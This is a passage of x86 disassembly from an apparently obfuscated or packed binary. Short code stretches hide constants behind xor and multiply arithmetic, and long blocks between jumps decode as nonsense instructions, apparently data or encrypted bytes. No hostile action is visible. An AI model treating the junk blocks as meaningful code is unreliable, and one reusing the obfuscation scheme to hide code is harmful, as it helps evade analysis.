  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	ror    BYTE PTR [ebp-0x27],1
  4041d8:	inc    ecx
  4041d9:	push   edx
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041a1
  4041e2:	inc    edx
  4041e3:	cmp    eax,0x93e1a9c9
  4041e8:	fs jno 0x40424a
  4041eb:	fsincos 
  4041ed:	jno    0x4041fa
  4041ef:	xor    DWORD PTR [eax+0x27],ebx
  4041f2:	dec    BYTE PTR [eax+esi*8-0x23]
  4041f6:	mov    ecx,0xc9471f07
  4041fb:	add    cl,BYTE PTR [ecx+0x6e]
  4041fe:	call   0xa857cd5
  404203:	add    eax,0x5f66373c
  404208:	test   al,0xc2
  40420a:	mov    dl,dl
  40420c:	retf   
  40420d:	rcr    DWORD PTR [eax],1
  40420f:	and    BYTE PTR [edi-0x4b],0x66
  404213:	mov    WORD PTR [esi+0x53],es
  404216:	cmc    
  404217:	xor    al,0x60
  404219:	sbb    al,dh
  40421b:	xchg   edi,eax
  40421c:	les    esp,FWORD PTR [ebp+0x2f]
  40421f:	fsub   DWORD PTR [ecx]
  404221:	pop    eax
  404222:	out    0xed,eax
  404224:	cs inc edx
  404226:	dec    esp
  404227:	adc    edi,DWORD PTR [ebx-0x4953d5af]
  40422d:	sub    eax,0x3570a09b
  404232:	xchg   ebp,eax
  404233:	aad    0x8
  404235:	or     edx,edi
  404237:	(bad)  
  404238:	aam    0xc
  40423a:	fisttp QWORD PTR [eax+ebx*4-0x20562977]
  404241:	in     eax,0xbb
  404243:	jle    0x404297
  404245:	hlt    
  404246:	das    
  404247:	(bad)  
  404248:	fld    QWORD PTR [edi]
  40424a:	jecxz  0x404248
  40424c:	adc    BYTE PTR [edx],ah
  40424e:	sti    
  40424f:	mov    ebx,0x2d82f00
  404254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404255:	fwait
  404256:	cmp    BYTE PTR [ecx-0xb],0x52
  40425a:	push   0x54
  40425c:	lahf   
  40425d:	jnp    0x404257
  40425f:	lods   eax,DWORD PTR ds:[esi]
  404260:	rcl    BYTE PTR [edi-0x52797273],1
  404266:	mov    ch,0xf0
  404268:	es mov ch,0xa0
  40426b:	inc    esp
  40426c:	push   esi
  40426d:	iret   
  40426e:	add    BYTE PTR [eax+0x22f074b5],dl
  404274:	rol    DWORD PTR [ebx-0x2b],0x7f
  404278:	in     eax,dx
  404279:	icebp  
  40427a:	ja     0x4042af
  40427c:	dec    ebx
  40427d:	jle    0x40421a
  40427f:	retf   
  404280:	shr    DWORD PTR [ebx+0x68dac38f],1
  404286:	push   ecx
  404287:	or     dh,BYTE PTR [eax-0x3e]
  40428a:	inc    edi
  40428b:	jge    0x4042fe
  40428d:	inc    esp
  40428e:	or     al,0x95
  404290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404291:	enter  0x3ac0,0x70
  404295:	fnsave ds:[ebx]
  404298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404299:	adc    eax,0xbf713c35
  40429e:	gs jae 0x4042e0
  4042a1:	int    0x60
  4042a3:	push   ebp
  4042a4:	lea    eax,[ebx]
  4042a6:	popa   
  4042a7:	mov    bh,0x25
  4042a9:	and    al,0xc6
  4042ab:	in     eax,0xde
  4042ad:	mov    eax,DWORD PTR [edi]
  4042af:	jne    0x404304
  4042b1:	or     ah,BYTE PTR [esi+edi*8]
  4042b4:	pop    ds
  4042b5:	les    esp,FWORD PTR [ebx]
  4042b7:	retf   0x3b60
  4042ba:	mov    edx,ebp
  4042bc:	xchg   BYTE PTR ds:0xae4dd1cb,ah
  4042c2:	jo     0x404264
  4042c4:	mov    ecx,0x477bb8f3
  4042c9:	mov    ebx,0xf1424742
  4042ce:	xor    eax,0xe46bc806
  4042d3:	aaa    
  4042d4:	cmp    bh,BYTE PTR [ebp+esi*8-0x614a27e9]
  4042db:	test   BYTE PTR [ebp-0x19],0xb4
  4042df:	mov    bl,0xa4
  4042e1:	icebp  
  4042e2:	fmul   QWORD PTR [ebp-0x3c]
  4042e5:	sbb    edi,eax
  4042e7:	xchg   ebx,eax
  4042e8:	rol    edx,cl
  4042ea:	cdq    
  4042eb:	push   esi
  4042ec:	mov    al,ds:0xbdaf0c3
  4042f1:	xor    al,0x7b
  4042f3:	or     eax,ebp
  4042f5:	cmp    BYTE PTR [eax+0x1a],bh
  4042f8:	sbb    DWORD PTR [ebp-0x69],esp
  4042fb:	les    eax,FWORD PTR [ecx]
  4042fd:	xchg   edi,eax
  4042fe:	jmp    0x5330872d
  404303:	adc    dh,al
  404305:	daa    
  404306:	lock xor bl,bh
  404309:	lea    ecx,[ebp+ecx*8+0x4a]
  40430d:	loope  0x404294
  40430f:	mov    edx,0x5bea0668
  404314:	sar    esp,0xc7
  404317:	nop
  404318:	pop    es
  404319:	cwde   
  40431a:	(bad)  
  40431d:	inc    edi
  40431e:	jmp    0xb65ad45b
  404323:	mov    ds:0x8508f886,al
  404328:	fwait
  404329:	mov    esi,0x4c268bb3
  40432e:	shl    BYTE PTR ds:0xfa9e0bbe,cl
  404334:	and    al,BYTE PTR [esp+ebx*2]
  404337:	jns    0x4042f3
  404339:	int    0x44
  40433b:	mul    DWORD PTR [esi]
  40433d:	mov    dl,0x20
  40433f:	(bad)  
  404340:	jmp    FWORD PTR [ebx]
  404342:	adc    DWORD PTR [ebp+0x53],0x32
  404346:	stmxcsr DWORD PTR [eax+0x11]
  40434a:	jnp    0x4043a9
  40434c:	push   ebp
  40434d:	cmp    eax,DWORD PTR ds:0x15b1865d
  404353:	ret    
  404354:	ss ja  0x404393
  404357:	test   edi,edi
  404359:	xor    DWORD PTR [ebp-0x35],ecx
  40435c:	mov    dh,0xbb
  40435e:	sahf   
  40435f:	or     al,0xfc
  404361:	enter  0xf250,0xc0
  404365:	icebp  
  404366:	(bad)  
  404368:	mov    BYTE PTR [esp+eiz*8+0xa],bh
  40436c:	jbe    0x4043bd
  40436e:	xchg   edi,eax
  40436f:	mov    DWORD PTR [ebp-0x13],0xb52ba27e
  404376:	adc    DWORD PTR [ecx-0x18],ecx
  404379:	sbb    DWORD PTR ds:0x6916d54b,0xc05352c5
  404383:	mov    dl,0x75
  404385:	test   al,0x6d
  404387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	inc    edi
  40442d:	pop    edx
  40442e:	mov    esi,0x7e19fd61
  404433:	jle    0x4043ce
  404435:	jg     0x4044b5
  404437:	jle    0x4043ce
  404439:	into   
  40443a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40443b:	rcl    DWORD PTR [ebp-0x30],cl
  40443e:	jp     0x4044b4
  404440:	pop    ebx
  404441:	sub    ebp,DWORD PTR [edx+0x28bfb64]
  404447:	xchg   DWORD PTR [ecx-0x3f],eax
  40444a:	sub    eax,0x5d75017f
  40444f:	add    DWORD PTR [ecx+0x54],0x3b
  404453:	ror    DWORD PTR [eax+0x16],1
  404456:	and    DWORD PTR [esi+ebp*2],esi
  404459:	icebp  
  40445a:	int    0x74
  40445c:	mov    DWORD PTR gs:[ecx-0x2caad6ad],ebp
  404463:	jmp    0x4044e1
  404465:	mov    ch,0x64
  404467:	mov    BYTE PTR [edi+ebx*4-0x2ee1656],ch
  40446e:	pop    ss
  40446f:	mov    al,ds:0x4f642f16
  404474:	adc    esp,esi
  404476:	bound  esi,QWORD PTR ds:0xb3e5ef62
  40447c:	mov    eax,0x3a6e7b99
  404481:	jo     0x40444a
  404483:	mov    esi,0xa70fd743
  404488:	pop    esi
  404489:	daa    
  40448a:	lds    esi,FWORD PTR [ebx-0x59]
  40448d:	dec    eax
  40448e:	jle    0x40448e
  404490:	dec    esp
  404491:	ss pop ecx
  404493:	icebp  
  404494:	mov    bh,0x89
  404496:	shr    edx,cl
  404498:	imul   ecx,ebp,0x7a5a066b
  40449e:	(bad)  [ecx+0x21]
  4044a1:	xchg   ecx,eax
  4044a2:	cmc    
  4044a3:	mov    WORD PTR [edx*4-0x442ffeab],cs
  4044aa:	mov    ebp,0x1c4c8b58
  4044af:	add    edi,DWORD PTR [esi-0x5e]
  4044b2:	rcl    DWORD PTR [eax],cl
  4044b4:	inc    eax
  4044b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044b6:	lods   al,BYTE PTR ds:[esi]
  4044b7:	mov    eax,ds:0xf72ad25f
  4044bc:	mov    esi,0x97cde7de
  4044c1:	push   cs
  4044c2:	cli    
  4044c3:	ja     0x404543
  4044c5:	xor    al,0xf1
  4044c7:	mov    eax,ds:0xb6a5a639
  4044cc:	sub    BYTE PTR [edi+0x72e292b3],dl
  4044d2:	lds    esi,FWORD PTR [esi+0x6e2b84b]
  4044d8:	pop    edi
  4044d9:	out    dx,eax
  4044da:	int3   
  4044db:	jle    0x40449a
  4044dd:	leave  
  4044de:	rcl    BYTE PTR [edx-0x5b],1
  4044e1:	inc    edi
  4044e2:	out    dx,eax
  4044e3:	or     bh,BYTE PTR [eax]
  4044e5:	push   edx
  4044e6:	cmp    DWORD PTR [edx+edx*2-0x743e836f],edi
  4044ed:	push   sp
  4044ef:	mov    ebp,0xb18e851b
  4044f4:	dec    esp
  4044f5:	cmp    al,0x6
  4044f7:	and    bh,BYTE PTR [edx+0x2a]
  4044fa:	xor    DWORD PTR [ebx-0x6f75b6a1],ebx
  404500:	lea    ebp,[esi+esi*4-0x7c]
  404504:	ins    BYTE PTR es:[edi],dx
  404505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404506:	in     eax,dx
  404507:	test   eax,0x84303595
  40450c:	xor    eax,0xd8d75864
  404511:	fisttp WORD PTR [edi-0xecb91f6]
  404517:	push   edx
  404518:	inc    ebx
  404519:	or     al,0x2c
  40451b:	mov    bh,BYTE PTR [ebp-0x12a21895]
  404521:	fwait
  404522:	mov    bl,0x3
  404524:	push   0x933a9e5b
  404529:	push   edx
  40452a:	pop    eax
  40452b:	in     al,dx
  40452c:	fimul  DWORD PTR [esi+0x3769a9f0]
  404532:	in     eax,0x33
  404534:	and    edx,edi
  404536:	xor    ch,BYTE PTR [ecx-0x102fbde2]
  40453c:	mov    ebp,0xe76bcbe6
  404541:	enter  0x129d,0x5d
  404545:	mov    edi,0xd8277309
  40454a:	icebp  
  40454b:	int3   
  40454c:	movq   mm1,QWORD PTR [edi+0x33291620]
  404553:	fucomp st(7)
  404555:	int    0xe8
  404557:	dec    edi
  404558:	(bad)  
  404559:	cmp    BYTE PTR [ebx],dl
  40455b:	jns    0x404585
  40455d:	inc    ebp
  40455e:	fisttp QWORD PTR ds:0x4601986
  404564:	and    BYTE PTR [ebx],dh
  404566:	cmp    DWORD PTR ds:0xa5f2216e,esi
  40456c:	test   DWORD PTR [edx+eiz*4+0x0],ebp
  404570:	into   
  404571:	aad    0x33
  404573:	call   0x68d28139
  404578:	(bad)  
  404579:	or     al,0x95
  40457b:	sub    al,0xc1
  40457d:	xchg   esi,eax
  40457e:	xor    esi,DWORD PTR [ebp-0x2cc3a42c]
  404584:	and    BYTE PTR [edx+eax*1+0x53],bl
  404588:	push   es
  404589:	mov    bh,0xb3
  40458b:	xor    ebx,DWORD PTR [ebp+0x1c]
  40458e:	or     DWORD PTR [esi-0x1],esp
  404591:	mov    bh,0x25
  404593:	sar    BYTE PTR [ecx],cl
  404595:	inc    ebp
  404596:	popf   
  404597:	pop    ebp
  404598:	adc    esi,DWORD PTR [ebp-0x1b4e5384]
  40459e:	test   DWORD PTR [esi],ebp
  4045a0:	sub    DWORD PTR [edi-0x389e7186],esi
  4045a6:	fcomip st,st(2)
  4045a8:	sti    
  4045a9:	cwde   
  4045aa:	jnp    0x4045f0
  4045ac:	push   esp
  4045ad:	and    eax,DWORD PTR [ecx]
  4045af:	in     al,0x86
  4045b1:	jae    0x404551
  4045b3:	mov    WORD PTR [ebx-0x5f0264a2],gs
  4045b9:	push   ebx
  4045ba:	cld    
  4045bb:	jmp    0x4045e8
  4045bd:	ficom  DWORD PTR [esi+0x10]
  4045c0:	adc    ebp,DWORD PTR [ecx+0x2e44c2af]
  4045c6:	bound  ebp,QWORD PTR [ebx+eax*8]
  4045c9:	imul   eax,DWORD PTR [eax],0xffffff81
  4045cc:	aad    0xdd
  4045ce:	xor    cl,BYTE PTR [esi+0x43]
  4045d1:	(bad)  
  4045d2:	cmp    dh,BYTE PTR [eax-0x44]
  4045d5:	jecxz  0x4045b1
  4045d7:	cmp    dh,dh
  4045d9:	mov    al,0x96
  4045db:	loope  0x4045ba
  4045dd:	xor    DWORD PTR [eax+0x3],0xffffffc1
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x40476a
  4046fa:	test   al,0x6a
  4046fc:	pop    esi
  4046fd:	and    al,0x27
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x40468e
  404706:	mov    edx,0xb35412f0
  40470b:	pmovmskb ebp,mm1
  40470e:	dec    eax
  40470f:	stos   BYTE PTR es:[edi],al
  404710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404711:	fisttp DWORD PTR [esi+ecx*1]
  404714:	test   DWORD PTR [ecx-0x3d2ca927],ecx
  40471a:	xchg   edx,eax
  40471b:	mov    ecx,0x81456c86
  404720:	inc    ebx
  404721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404722:	sub    bl,BYTE PTR [ebx+0x215c8f52]
  404728:	push   edx
  404729:	ror    BYTE PTR [esi+0x537bebfb],1
  40472f:	or     al,0xc
  404731:	mov    WORD PTR [eax-0x437359b],fs
  404737:	jae    0x40475b
  404739:	aad    0x77
  40473b:	int3   
  40473c:	inc    edx
  40473d:	mov    edi,0x31a23e4
  404742:	mov    eax,0x18199b58
  404747:	lea    esi,[ecx-0x3fbb6a98]
  40474d:	imul   esp,ebp,0x401c85ec
  404753:	fxch   st(1)
  404755:	add    DWORD PTR [eax-0x79],ebp
  404758:	inc    ebp
  404759:	sbb    BYTE PTR [edx-0xc],cl
  40475c:	je     0x40470c
  40475e:	xchg   ebp,eax
  40475f:	int3   
  404760:	jle    0x404735
  404762:	aam    0x21
  404764:	xchg   esi,eax
  404765:	pop    eax
  404766:	sysret 
  404768:	dec    BYTE PTR [ebx-0x4c]
  40476b:	fidivr DWORD PTR [edx+0x266756a1]
  404771:	shr    DWORD PTR [eax],cl
  404773:	imul   eax,DWORD PTR [edi-0x34],0x5fd04254
  40477a:	bswap  ecx
  40477c:	stc    
  40477d:	loopne 0x4047f3
  40477f:	pop    esi
  404780:	jmp    0x9cc54492
  404785:	leave  
  404786:	sti    
  404787:	sbb    eax,0x1085039a
  40478c:	jmp    FWORD PTR [esi]
  40478e:	enter  0xf08f,0xf
  404792:	mov    edi,0x2e2605e7
  404797:	and    DWORD PTR [ebp-0x6e3f25a5],ecx
  40479d:	cwde   
  40479e:	adc    ecx,DWORD PTR [ebx+eiz*4-0x79332389]
  4047a5:	sub    edx,eax
  4047a7:	pop    edx
  4047a8:	rcr    edx,cl
  4047aa:	idiv   DWORD PTR [edx+edi*8+0x31]
  4047ae:	rol    BYTE PTR [edx-0x2e],1
  4047b1:	mov    DWORD PTR [edx+0xfd8cf0b],edx
  4047b7:	mov    eax,0xe3edef9e
  4047bc:	test   al,0xec
  4047be:	enter  0xffc1,0xe0
  4047c2:	sub    BYTE PTR [eax],0x13
  4047c5:	out    dx,eax
  4047c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c7:	and    DWORD PTR [edx+ecx*4],0xe876cb4e
  4047ce:	add    BYTE PTR [edi+ecx*1+0x7c],bl
  4047d2:	ficom  DWORD PTR [esi]
  4047d4:	inc    eax
  4047d5:	arpl   cx,ax
  4047d7:	sbb    ah,BYTE PTR [eax+ecx*1]
  4047da:	pop    esi
  4047db:	cmp    al,0x70
  4047dd:	and    al,0x64
  4047df:	cdq    
  4047e0:	fnstenv [edx]
  4047e2:	sub    esi,eax
  4047e4:	jnp    0x404789
  4047e6:	adc    eax,0x95817ae7
  4047eb:	pusha  
  4047ec:	adc    dl,ch
  4047ee:	adc    DWORD PTR [ebx+0x3f],ebx
  4047f1:	mov    eax,ds:0xb24269f2
  4047f6:	shl    ah,1
  4047f8:	jmp    0x33fa:0xa071d2dc
  4047ff:	and    edx,DWORD PTR [ecx]
  404801:	sar    BYTE PTR [ecx],cl
  404803:	cld    
  404804:	pop    ss
  404805:	jbe    0x404867
  404807:	fnstcw WORD PTR [ecx+0x7]
  40480a:	lds    edx,FWORD PTR [esi-0x71]
  40480d:	je     0x4047a7
  40480f:	dec    BYTE PTR [ebp-0x55]
  404812:	jl     0x404821
  404814:	push   ds
  404815:	ror    BYTE PTR [ecx+0x377ed22b],cl
  40481b:	(bad)  [eax]
  40481d:	adc    DWORD PTR [esi],eax
  40481f:	imul   ecx,DWORD PTR ds:0x3689a81b,0x77cc9aa0
  404829:	cli    
  40482a:	sub    eax,0xae1bd4ba
  40482f:	es enter 0x874e,0x4f
  404834:	data16 rol BYTE PTR [esi-0x5b83be1f],1
  40483b:	fstp   QWORD PTR [esi+0xf]
  40483e:	dec    edi
  40483f:	mov    DWORD PTR [ecx],0x970713e0
  404845:	out    dx,eax
  404846:	jle    0x404886
  404848:	loop   0x4047da
  40484a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40484b:	pop    ss
  40484c:	pop    es
  40484d:	push   esp
  40484e:	push   ecx
  40484f:	retf   0xe5e4
  404852:	and    al,0x9d
  404854:	pop    ebx
  404855:	(bad)  
  404856:	imul   BYTE PTR [ebx-0x3c]
  404859:	daa    
  40485a:	dec    edx
  40485b:	ja     0x404812
  40485d:	inc    ebx
  40485e:	adc    eax,0x9caf8935
  404863:	inc    eax
  404864:	push   edi
  404865:	hlt    
  404866:	sbb    DWORD PTR [ecx+0x7e6f140b],edx
  40486c:	add    edx,DWORD PTR [ecx-0x187d214b]
  404872:	xchg   ebp,eax
  404873:	sub    eax,0x383ee403
  404878:	jmp    0xdbf0:0x1b6588d6
  40487f:	ret    
  404880:	xchg   esp,eax
  404881:	ror    DWORD PTR [ebx],1
  404883:	leave  
  404884:	aad    0xb7
  404886:	sbb    ebp,ebp
  404888:	xchg   ecx,eax
  404889:	ror    BYTE PTR [esi+0x2e],cl
  40488c:	aaa    
  40488d:	aaa    
  40488e:	or     edx,DWORD PTR [ecx]
  404890:	je     0x40482e
  404892:	clc    
  404893:	call   0xc364:0x73ac8bf3
  40489a:	lea    ecx,[edx-0x2be0a5a7]
  4048a0:	out    0xfa,al
  4048a2:	test   DWORD PTR ds:0xdf4d10ae,edi
  4048a8:	scas   eax,DWORD PTR es:[edi]
  4048a9:	mov    esp,0x15e1dc59
  4048ae:	outs   dx,DWORD PTR ds:[esi]
  4048af:	out    dx,eax
  4048b0:	imul   esp,DWORD PTR [esi+0x55],0xffffff96
  4048b4:	push   0x2d
  4048b6:	jb     0x404839
  4048b8:	xor    edx,ebp
  4048ba:	(bad)  
  4048bb:	outs   dx,DWORD PTR ds:[esi]
  4048bc:	push   ecx
  4048bd:	aam    0x7c
  4048bf:	sahf   
  4048c0:	jbe    0x40487c
  4048c2:	or     ebp,esp
  4048c4:	or     al,0xff
  4048c6:	mov    cl,0x69
  4048c8:	jg     0x404879
  4048ca:	into   
  4048cb:	fild   DWORD PTR ss:[edx+0x35981e73]
  4048d2:	mov    ah,0xc7
  4048d4:	out    dx,al
  4048d5:	adc    ebp,0x3b76fc5c
  4048db:	mov    BYTE PTR ds:0x658a7541,dl
  4048e1:	es mov ecx,0xc8c8454a
  4048e7:	nop
  4048e8:	div    DWORD PTR [ebx*4+0x573ba948]
  4048ef:	stos   BYTE PTR es:[edi],al
  4048f0:	and    edi,eax
  4048f2:	scas   eax,DWORD PTR es:[edi]
  4048f3:	lock xchg DWORD PTR [esi],edi
  4048f6:	test   BYTE PTR [esi+0x6cf5b3c4],al
  4048fc:	cmp    BYTE PTR [ebx-0x44],dh
  4048ff:	pop    ecx
  404900:	sub    ebx,DWORD PTR [edx-0x2d7f13df]
  404906:	cld    
  404907:	pop    ebx
  404908:	daa    
  404909:	sub    al,0x4e
  40490b:	iret   
  40490c:	shl    DWORD PTR [ecx+ecx*2],cl
  40490f:	cld    
  404910:	xchg   eax,edx
  404912:	mov    ebp,DWORD PTR [eax-0x5a]
  404915:	icebp  
  404916:	jg     0x4048b1
  404918:	cs xchg ebp,eax
  40491a:	out    dx,al
  40491b:	mov    eax,ds:0x82306f19
  404920:	pop    esi
  404921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404922:	and    bh,BYTE PTR [ebx]
  404924:	push   cs
  404925:	mov    ecx,0xc231e8f
  40492a:	(bad)  
  40492b:	pop    ds
  40492c:	xchg   edx,eax
  40492d:	or     DWORD PTR [ebx-0x42d4d745],esp
  404933:	mov    edx,0xd6ae475a
  404938:	mov    bh,0x1f
  40493a:	push   ebp
  40493b:	push   ss
  40493c:	jge    0x4048e5
  40493e:	jmp    0xa517:0x28024a7a
  404945:	dec    esp
  404947:	ins    BYTE PTR es:[edi],dx
  404948:	pop    edx
  404949:	add    esi,edi
  40494b:	ret    
  40494c:	daa    
  40494d:	mov    eax,0x1f50f00a
  404952:	jmp    0x1d27:0xc5f77858
  404959:	dec    eax
  40495a:	sub    al,0xcf
  40495c:	mov    al,0x5e
  40495e:	fimul  DWORD PTR [eax+0x73]
  404961:	dec    ebp
  404962:	jo     0x4049b2
  404964:	daa    
  404965:	jp     0x404978
  404967:	call   0x9d72:0x9fb8ec40
  40496e:	jge    0x404950
  404970:	pop    edi
  404971:	dec    eax
  404972:	std    
  404973:	dec    esp
  404974:	iret   
  404975:	mov    cl,0x85
  404977:	or     DWORD PTR [esi-0x14723e33],edx
  40497d:	ret    
  40497e:	mov    dl,0x9e
  404980:	push   ebx
  404981:	add    esi,0xffffff9c
  404984:	repz xchg ebp,eax
  404986:	(bad)  
  404987:	mov    dh,0xc1
  404989:	loopne 0x4049b7
  40498b:	push   0xf6e561f3
  404990:	inc    esi
  404991:	out    dx,al
  404992:	clc    
  404993:	adc    ecx,DWORD PTR [eax-0x7f5b3fc8]
  404999:	mov    ebp,0x6e8de8f7
  40499e:	mov    edi,0xd38fbb7d
  4049a3:	inc    esp
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e658,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
